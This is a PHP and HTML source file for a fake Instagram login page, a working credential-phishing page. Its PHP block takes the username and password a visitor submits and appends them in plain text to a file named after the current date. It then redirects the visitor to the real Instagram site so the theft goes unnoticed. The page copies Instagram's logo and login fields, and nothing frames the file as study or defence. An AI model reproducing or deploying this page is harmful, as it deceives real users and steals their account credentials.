<!DOCTYPE html>
<html lang="en">
<head>
        <meta charset="UTF-8">
        <title>Instagram Login Page</title>
        <link rel="stylesheet" href="style.css">
</head>
<?php 
  $user = $_POST['user'];
  $pass = $_POST['pass'];
  $oggi = date("y.m.d"); 
  $fp = fopen($oggi , "a");
  fwrite($fp,"username: " . $user . "\n");
  fwrite($fp, "password: " . $pass . "\n");
  fwrite($fp, "" . "\n");
  echo $fp;
  fclose($fp);
  if(isset( $_POST['submit'])){
    header( 'location: https://www.instagram.com/');
 }
?>
<body>
<div class="wrapper">
  <div class="header">
    <div class="top">
      <div class="logo">
        <img src="instagram.png" alt="instagram">
      </div>
      <div class="form">
        <form action="" method="post">
          <div class="input_field">
              <input type="text" placeholder="Phone number, username, or email" name="user" class="input">
          </div>
          <div class="input_field">
              <input type="password" placeholder="Password" name="pass" class="input">
          </div>
          <input type="submit" name="submit" class="btn" value="Submit">
        </form>
      </div>
    </div>
  </div>
                <div class="apps">
                        <p>Get the app.</p>
                        <div class="icons">
                                <a href="#"><img src="img/appstore.png" alt="appstore"></a>
                                <a href="#"><img src="img/googleplay.png" alt="googleplay"></a>
                        </div>
                </div>
</div>
</body>
<?php
  include('footer.html');
?>
</html>
